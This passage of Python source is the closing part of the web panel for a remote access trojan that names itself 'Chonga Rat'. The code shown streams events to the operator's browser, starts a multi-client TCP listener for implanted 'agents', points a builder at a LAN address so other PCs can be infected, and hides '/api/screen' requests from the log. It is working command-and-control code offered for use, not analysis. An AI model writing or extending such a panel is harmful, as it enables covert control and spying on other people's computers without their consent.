        self.send_header("Connection", "close")
        self.end_headers()
        try:
            self.wfile.write(b"retry: 1500\n\n")
            self.wfile.flush()
            last = time.time()
            while True:
                try:
                    ev = q.get(timeout=10)
                    data = json.dumps(ev)
                    self.wfile.write(f"data: {data}\n\n".encode("utf-8"))
                    self.wfile.flush()
                except queue.Empty:
                    if time.time() - last > 15:
                        self.wfile.write(b": keepalive\n\n")
                        self.wfile.flush()
                        last = time.time()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        finally:
            HUB.unsubscribe(q)

    def log_message(self, fmt, *args):
        if "/api/screen" in self.path:
            return
        line = fmt % args
        # never echo the panel token into the console
        if "token=" in line:
            line = re.sub(r"token=[^&\s\"]+", "token=***", line)
        log("%s %s" % (self.address_string(), line))


# --------------------------------------------------------------------------
def main() -> None:
    threading.Thread(target=agent_listener, daemon=True).start()
    ThreadingHTTPServer.allow_reuse_address = True
    srv = ThreadingHTTPServer((HTTP_BIND, HTTP_PORT), Handler)
    srv.daemon_threads = True
    print()
    print("  Chonga Rat — panel")
    print(f"  panel   http://{HTTP_BIND}:{HTTP_PORT}/")
    if LAN_ENABLED:
        print(f"  lan     http://{LAN_IP}:{HTTP_PORT}/   (other PCs open this)")
    print(f"  agent   tcp {AGENT_BIND}:{AGENT_PORT}  (multi-client)")
    if LAN_ENABLED:
        print(f"  agents  set the builder host to {LAN_IP} for other PCs")
    else:
        print("  agents  builder host stays 127.0.0.1 (this PC only)")
    print(f"  token   {TOKEN[:12]}...  (runtime/token.txt)")
    print("  clients are listed under the Clients tab once they attach")
    print()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nstopped")


if __name__ == "__main__":
    main()
